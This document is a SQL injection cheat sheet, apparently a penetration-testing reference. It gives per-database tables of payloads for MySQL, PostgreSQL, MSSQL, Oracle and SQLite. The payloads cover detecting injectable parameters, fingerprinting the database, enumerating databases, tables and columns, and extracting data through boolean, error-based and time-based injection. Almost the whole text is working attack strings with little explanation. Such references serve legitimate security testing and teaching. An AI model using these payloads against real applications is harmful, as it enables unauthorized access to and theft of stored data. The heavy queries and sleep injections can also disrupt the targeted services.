---
title: "SQL Injection Cheatsheet"
---
# SQL Injection Cheatsheet

## Break & Repair Method

A simplistic but generally reliable method for finding basic SQL injections.

First, "break" the statement by injecting a single or double quote into an otherwise valid value (e.g. username=admin').

Then, replace the injected quote with each of the following "repairs" in turn, to see if one results in the original (uninjected) response:

<table>
<thead>
<tr>
<th>Repair</th>
</tr>
</thead>
<tbody>
<tr>
<td>' '</td>
</tr>
<tr>
<td>'||'</td>
</tr>
<tr>
<td>'+'</td>
</tr>
<tr>
<td>' AND '1'='1</td>
</tr>
<tr>
<td>' -- -</td>
</tr>
</tbody>
</table>

## Identifying Variants

Once a potential injection is found, the database variant (e.g. MySQL, PostgreSQL) can be identified by injecting the following payloads in order until a positive result is returned.

<table>
<thead>
<tr>
<th>Order</th>
<th>Payload</th>
<th>If Valid</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>AND 'foo' 'bar' = 'foobar'</td>
<td>MySQL</td>
</tr>
<tr>
<td>2</td>
<td>AND DATALENGTH('foo') = 3</td>
<td>MSSQL</td>
</tr>
<tr>
<td>3</td>
<td>AND TO_HEX(1) = '1'</td>
<td>PostgreSQL</td>
</tr>
<tr>
<td>4</td>
<td>AND LENGTHB('foo') = '3'</td>
<td>Oracle</td>
</tr>
<tr>
<td>5</td>
<td>AND GLOB('foo*', 'foobar') = 1</td>
<td>SQLite</td>
</tr>
</tbody>
</table>

## Comments

<table>
<thead>
<tr>
<th>Variant</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td rowspan="3" class="span">MySQL</td>
<td># comment</td>
</tr>
<tr>
<td>-- comment</td>
</tr>
<tr>
<td>/*comment*/</td>
</tr>
<tr>
<td rowspan="2" class="span">PostgreSQL</td>
<td>-- comment</td>
</tr>
<tr>
<td>/*comment*/</td>
</tr>
<tr>
<td rowspan="2" class="span">MSSQL</td>
<td>-- comment</td>
</tr>
<tr>
<td>/*comment*/</td>
</tr>
<tr>
<td rowspan="2" class="span">Oracle</td>
<td>-- comment</td>
</tr>
<tr>
<td>/*comment*/</td>
</tr>
<tr>
<td rowspan="2" class="span">SQLite</td>
<td>-- comment</td>
</tr>
<tr>
<td>/*comment*/</td>
</tr>
</tbody>
</table>

## String Concatenation

<table>
<thead>
<tr>
<th>Variant</th>
<th>Function / Syntax</th>
</tr>
</thead>
<tbody>
<tr>
<td rowspan="2" class="span">MySQL</td>
<td>'foo' 'bar'</td>
</tr>
<tr>
<td>CONCAT('foo', 'bar')</td>
</tr>
<tr>
<td rowspan="2" class="span">PostgreSQL</td>
<td>'foo'||'bar'</td>
</tr>
<tr>
<td>CONCAT('foo', 'bar')</td>
</tr>
<tr>
<td rowspan="2" class="span">MSSQL</td>
<td>'foo'+'bar'</td>
</tr>
<tr>
<td>CONCAT('foo', 'bar')</td>
</tr>
<tr>
<td rowspan="2" class="span">Oracle</td>
<td>'foo'||'bar'</td>
</tr>
<tr>
<td>CONCAT('foo', 'bar')</td>
</tr>
<tr>
<td rowspan="2" class="span">SQLite</td>
<td>'foo'||'bar'</td>
</tr>
<tr>
<td>CONCAT('foo', 'bar')</td>
</tr>
</tbody>
</table>

## Substring

<table>
<thead>
<tr>
<th>Variant</th>
<th>Function / Syntax</th>
</tr>
</thead>
<tbody>
<tr>
<td rowspan="2" class="span">MySQL</td>
<td>SUBSTRING('foobar', START, LENGTH)</td>
</tr>
<tr>
<td>SUBSTR('foobar', START, LENGTH)</td>
</tr>
<tr>
<td rowspan="2" class="span">PostgreSQL</td>
<td>SUBSTRING('foobar', START, LENGTH)</td>
</tr>
<tr>
<td>SUBSTR('foobar', START, LENGTH)</td>
</tr>
<tr>
<td class="span">MSSQL</td>
<td>SUBSTRING('foobar', START, LENGTH)</td>
</tr>
<tr>
<td class="span">Oracle</td>
<td>SUBSTR('foobar', START, LENGTH)</td>
</tr>
<tr>
<td rowspan="2" class="span">SQLite</td>
<td>SUBSTRING('foobar', START, LENGTH)</td>
</tr>
<tr>
<td>SUBSTR('foobar', START, LENGTH)</td>
</tr>
</tbody>
</table>

## Length

<table>
<thead>
<tr>
<th>Variant</th>
<th>Function</th>
<th>Notes</th>
</tr>
</thead>
<tbody>
<tr>
<td rowspan="2" class="span">MySQL</td>
<td>LENGTH('foo')</td>
<td>Counts number of bytes</td>
</tr>
<tr>
<td>CHAR_LENGTH('foo')</td>
<td>Counts number of chars (inc. multi-byte chars)</td>
</tr>
<tr>
<td class="span">PostgreSQL</td>
<td>LENGTH('foo')</td>
<td>Counts number of chars (inc. multi-byte chars)</td>
</tr>
<tr>
<td rowspan="2" class="span">MSSQL</td>
<td>DATALENGTH('foo')</td>
<td>Counts number of bytes</td>
</tr>
<tr>
<td>LEN('foo')</td>
<td>Counts number of chars (inc. multi-byte chars)</td>
</tr>
<tr>
<td rowspan="2" class="span">Oracle</td>
<td>LENGTHB('foo')</td>
<td>Counts number of bytes</td>
</tr>
<tr>
<td>LENGTH('foo')</td>
<td>Counts number of chars (inc. multi-byte chars)</td>
</tr>
<tr>
<td class="span">SQLite</td>
<td>LENGTH('foo')</td>
<td>Counts number of chars (inc. multi-byte chars)</td>
</tr>
</tbody>
</table>

## Group Concatenation

<table>
<thead>
<tr>
<th>Variant</th>
<th>Function</th>
</tr>
</thead>
<tbody>
<tr>
<td class="span">MySQL</td>
<td>GROUP_CONCAT(expression, 'DELIMITER')</td>
</tr>
<tr>
<td class="span">PostgreSQL</td>
<td>STRING_AGG(expression, 'DELIMITER')</td>
</tr>
<tr>
<td class="span">MSSQL</td>
<td>STRING_AGG(expression, 'DELIMITER')</td>
</tr>
<tr>
<td class="span">Oracle</td>
<td>LISTAGG(expression, 'DELIMITER')</td>
</tr>
<tr>
<td class="span">SQLite</td>
<td>GROUP_CONCAT(expression, 'DELIMITER')</td>
</tr>
</tbody>
</table>

## Convert Characters to Integers for Comparisons

Useful for blind SQL injections to determine the range a character falls in. Note that MySQL and Oracle's functions output a hexadecimal number, while the others output a decimal.

<table>
<thead>
<tr>
<th>Variant</th>
<th>Function</th>
<th>Output</th>
</tr>
</thead>
<tbody>
<tr>
<td class="span">MySQL</td>
<td>HEX('a')</td>
<td>61</td>
</tr>
<tr>
<td class="span">PostgreSQL</td>
<td>ASCII('a')</td>
<td>97</td>
</tr>
<tr>
<td class="span">MSSQL</td>
<td>UNICODE('a')</td>
<td>97</td>
</tr>
<tr>
<td class="span">Oracle</td>
<td>RAWTOHEX('a')</td>
<td>61</td>
</tr>
<tr>
<td class="span">SQLite</td>
<td>UNICODE('a')</td>
<td>97</td>
</tr>
</tbody>
</table>

## Limiting & Offsetting Queries

<table>
<thead>
<tr>
<th>Variant</th>
<th>Limit Query Result to 1 Row</th>
<th>Limit to 1 Row, Starting at Row 5</th>
</tr>
</thead>
<tbody>
<tr>
<td rowspan="2" class="span">MySQL</td>
<td rowspan="2">SELECT * FROM users LIMIT 1</td>
<td>SELECT * FROM users LIMIT 4, 1</td>
</tr>
<tr>
<td>SELECT * FROM users LIMIT 1 OFFSET 4</td>
</tr>
<tr>
<td class="span">PostgreSQL</td>
<td>SELECT * FROM users LIMIT 1</td>
<td>SELECT * FROM users LIMIT 1 OFFSET 4</td>
</tr>
<tr>
<td class="span">MSSQL</td>
<td>SELECT * FROM users ORDER BY 1 OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY</td>
<td>SELECT * FROM users ORDER BY 1 OFFSET 4 ROWS FETCH NEXT 1 ROWS ONLY</td>
</tr>
<tr>
<td class="span">Oracle >= v12</td>
<td>SELECT * FROM users FETCH NEXT 1 ROWS ONLY</td>
<td>SELECT * FROM users OFFSET 4 ROWS FETCH NEXT 1 ROWS ONLY</td>
</tr>
<tr>
<td class="span">Oracle <= v11</td>
<td>SELECT * FROM users WHERE ROWNUM = 1</td>
<td>SELECT * FROM users WHERE ROWNUM = 5</td>
</tr>
<tr>
<td rowspan="2" class="span">SQLite</td>
<td rowspan="2">SELECT * FROM users LIMIT 1</td>
<td>SELECT * FROM users LIMIT 4, 1</td>
</tr>
<tr>
<td>SELECT * FROM users LIMIT 1 OFFSET 4</td>
</tr>
</tbody>
</table>

## Database Version

<table>
<thead>
<tr>
<th>Variant</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td rowspan="3" class="span">MySQL</td>
<td>@@VERSION</td>
</tr>
<tr>
<td>VERSION()</td>
</tr>
<tr>
<td>@@GLOBAL.VERSION</td>
</tr>
<tr>
<td class="span">PostgreSQL</td>
<td>VERSION()</td>
</tr>
<tr>
<td class="span">MSSQL</td>
<td>@@VERSION</td>
</tr>
<tr>
<td rowspan="2" class="span">Oracle</td>
<td>SELECT BANNER FROM v$version WHERE ROWNUM = 1</td>
</tr>
<tr>
<td>SELECT BANNER FROM gv$version WHERE ROWNUM = 1
</td>
</tr>
<tr>
<td class="span">SQLite</td>
<td>sqlite_version()</td>
</tr>
</tbody>
</table>

## Current Database / Schema

<table>
<thead>
<tr>
<th>Variant</th>
<th>Query</th>
</tr>
</thead>
<tbody>
<tr>
<td class="span">MySQL</td>
<td>SELECT DATABASE()</td>
</tr>
<tr>
<td rowspan="2" class="span">PostgreSQL</td>
<td>SELECT CURRENT_DATABASE()</td>
</tr>
<tr>
<td>SELECT CURRENT_SCHEMA()</td>
</tr>
<tr>
<td rowspan="2" class="span">MSSQL</td>
<td>SELECT DB_NAME()</td>
</tr>
<tr>
<td>SELECT SCHEMA_NAME()</td>
</tr>
<tr>
<td rowspan="3" class="span">Oracle</td>
<td>SELECT name FROM V$database</td>
</tr>
<tr>
<td>SELECT * FROM global_name</td>
</tr>
<tr>
<td>SELECT sys_context('USERENV', 'CURRENT_SCHEMA') FROM dual;</td>
</tr>
<tr>
<td class="span">SQLite</td>
<td>N/A</td>
</tr>
</tbody>
</table>

## List Databases

<table>
<thead>
<tr>
<th>Variant</th>
<th>Query</th>
</tr>
</thead>
<tbody>
<tr>
<td rowspan="2" class="span">MySQL</td>
<td>SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA</td>
</tr>
<tr>
<td>SELECT db FROM mysql.db</td>
</tr>
<tr>
<td rowspan="2" class="span">PostgreSQL</td>
<td>SELECT datname FROM pg_database</td>
</tr>
<tr>
<td>SELECT DISTINCT(schemaname) FROM pg_tables</td>
</tr>
<tr>
<td rowspan="2" class="span">MSSQL</td>
<td>SELECT name FROM master.sys.databases</td>
</tr>
<tr>
<td>SELECT name FROM master..sysdatabases</td>
</tr>
<tr>
<td class="span">Oracle</td>
<td>SELECT OWNER FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)</td>
</tr>
<tr>
<td class="span">SQLite</td>
<td>N/A</td>
</tr>
</tbody>
</table>

## List Tables

<table>
<thead>
<tr>
<th>Variant</th>
<th>Query</th>
</tr>
</thead>
<tbody>
<tr>
<td rowspan="2" class="span">MySQL</td>
<td>SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='[DBNAME]'</td>
</tr>
<tr>
<td>SELECT database_name,table_name FROM mysql.innodb_table_stats WHERE database_name='[DBNAME]'</td>
</tr>
<tr>
<td rowspan="2" class="span">PostgreSQL</td>
<td>SELECT tablename FROM pg_tables WHERE schemaname = '[SCHEMA_NAME]'</td>
</tr>
<tr>
<td>SELECT table_name FROM information_schema.tables WHERE table_schema='[SCHEMA_NAME]'</td>
</tr>
<tr>
<td rowspan="2" class="span">MSSQL</td>
<td>SELECT table_name FROM information_schema.tables WHERE table_catalog='[DBNAME]'</td>
</tr>
<tr>
<td>SELECT name FROM [DBNAME]..sysobjects WHERE xtype='U'</td>
</tr>
<tr>
<td class="span">Oracle</td>
<td>SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='[DBNAME]'</td>
</tr>
<tr>
<td class="span">SQLite</td>
<td>SELECT tbl_name FROM sqlite_master WHERE type='table'</td>
</tr>
</tbody>
</table>

## List Columns

<table>
<thead>
<tr>
<th>Variant</th>
<th>Query</th>
</tr>
</thead>
<tbody>
<tr>
<td class="span">MySQL</td>
<td>SELECT column_name,column_type FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='[TABLE_NAME]' AND table_schema='[DBNAME]'</td>
</tr>
<tr>
<td class="span">PostgreSQL</td>
<td>SELECT column_name,data_type FROM information_schema.columns WHERE table_schema='[DBNAME]' AND table_name='[TABLE_NAME]'</td>
</tr>
<tr>
<td class="span">MSSQL</td>
<td>SELECT COL_NAME(OBJECT_ID('[DBNAME].[TABLE_NAME]'), [INDEX])</td>
</tr>
<tr>
<td class="span">Oracle</td>
<td>SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='[TABLE_NAME]' AND OWNER='[DBNAME]'</td>
</tr>
<tr>
<td rowspan="2" class="span">SQLite</td>
<td>SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='[TABLE_NAME]'</td>
</tr>
<tr>
<td>SELECT name FROM PRAGMA_TABLE_INFO('[TABLE_NAME]')</td>
</tr>
</tbody>
</table>

## Boolean Error Inferential Exploitation

<table>
<thead>
<tr>
<th>Variant</th>
<th>Payload</th>
</tr>
</thead>
<tbody>
<tr>
<td class="span">MySQL</td>
<td>AND 1=(SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),1))</td>
</tr>
<tr>
<td class="span">PostgreSQL</td>
<td>AND 1=(SELECT CASE WHEN (1=1) THEN CAST(1/0 AS INTEGER) ELSE 1 END)</td>
</tr>
<tr>
<td class="span">MSSQL</td>
<td>AND 1=(SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)</td>
</tr>
<tr>
<td class="span">Oracle</td>
<td>AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)</td>
</tr>
<tr>
<td rowspan="2" class="span">SQLite</td>
<td>AND 1=(SELECT CASE WHEN (1=1) THEN load_extension(1) ELSE 1 END)</td>
</tr>
<tr>
<td>AND 1=(SELECT CASE WHEN (1=1) THEN abs(-9223372036854775808) ELSE 1 END)</td>
</tr>
</tbody>
</table>

## Error Based Exploitation

The following injections should cause a database error and return the version information of the database variant within that error.

### MySQL

<table>
<thead>
<tr>
<th>Injection</th>
</tr>
</thead>
<tbody>
<tr>
<td>AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -</td>
</tr>
<tr>
<td>AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -</td>
</tr>
<tr>
<td>AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -</td>
</tr>
<tr>
<td>AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -</td>
</tr>
<tr>
<td>OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -</td>
</tr>
<tr>
<td>AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -</td>
</tr>
</tbody>
</table>

### PostgreSQL

<table>
<thead>
<tr>
<th>Injection</th>
</tr>
</thead>
<tbody>
<tr>
<td>AND 1337=CAST('~'||(SELECT version())::text||'~' AS NUMERIC) -- -</td>
</tr>
<tr>
<td>AND (CAST('~'||(SELECT version())::text||'~' AS NUMERIC)) -- -</td>
</tr>
<tr>
<td>AND CAST((SELECT version()) AS INT)=1337 -- -</td>
</tr>
<tr>
<td>AND (SELECT version())::int=1 -- -</td>
</tr>
</tbody>
</table>

### MSSQL

<table>
<thead>
<tr>
<th>Injection</th>
</tr>
</thead>
<tbody>
<tr>
<td>AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -</td>
</tr>
<tr>
<td>AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -</td>
</tr>
<tr>
<td>AND 1337=CONCAT('~',(SELECT @@version),'~') -- -</td>
</tr>
</tbody>
</table>

### Oracle

<table>
<thead>
<tr>
<th>Injection</th>
</tr>
</thead>
<tbody>
<tr>
<td>AND 1337=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'~'||(REPLACE(REPLACE(REPLACE(REPLACE((SELECT banner FROM v$version),' ','_'),'$','(DOLLAR)'),'@','(AT)'),'#','(HASH)'))||'~'||CHR(62))) FROM DUAL) -- -</td>
</tr>
<tr>
<td>AND 1337=UTL_INADDR.GET_HOST_ADDRESS('~'||(SELECT banner FROM v$version)||'~') -- -</td>
</tr>
<tr>
<td>AND 1337=CTXSYS.DRITHSX.SN(1337,'~'||(SELECT banner FROM v$version)||'~') -- -</td>
</tr>
<tr>
<td>AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH('~'||(SELECT banner FROM v$version)||'~') -- -</td>
</tr>
</tbody>
</table>

## Time Based Exploitation

### Simple Time Based Injections

Note that these injections are inherently dangerous as the sleep function may execute multiple times.

These should only be used if you are certain only one row is going to be evaluated by the query you are injecting into.

<table>
<thead>
<tr>
<th>Variant</th>
<th>Query</th>
</tr>
</thead>
<tbody>
<tr>
<td class="span">MySQL</td>
<td>AND SLEEP(10)=0</td>
</tr>
<tr>
<td class="span">PostgreSQL</td>
<td>AND 'RANDSTR'||pg_sleep(10)='RANDSTR'</td>
</tr>
<tr>
<td class="span">MSSQL</td>
<td>AND 1337=(CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 1337 END)</td>
</tr>
<tr>
<td class="span">Oracle</td>
<td>AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)</td>
</tr>
<tr>
<td class="span">SQLite</td>
<td>AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))</td>
</tr>
</tbody>
</table>

### Complex Time Based Injections

These injections are "safe" and should only ever sleep once per statement.

<table>
<thead>
<tr>
<th>Variant</th>
<th>Query</th>
</tr>
</thead>
<tbody>
<tr>
<td class="span">MySQL</td>
<td>AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)</td>
</tr>
<tr>
<td class="span">PostgreSQL</td>
<td>AND 1337=(CASE WHEN (1=1) THEN (SELECT 1337 FROM PG_SLEEP(10)) ELSE 1337 END)</td>
</tr>
<tr>
<td class="span">MSSQL</td>
<td>AND 1337=(CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 1337 END)</td>
</tr>
<tr>
<td class="span">Oracle</td>
<td>AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)</td>
</tr>
<tr>
<td class="span">SQLite</td>
<td>AND 1337=(CASE WHEN (1=1) THEN (SELECT 1337 FROM (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))))) ELSE 1337 END)</td>
</tr>
</tbody>
</table>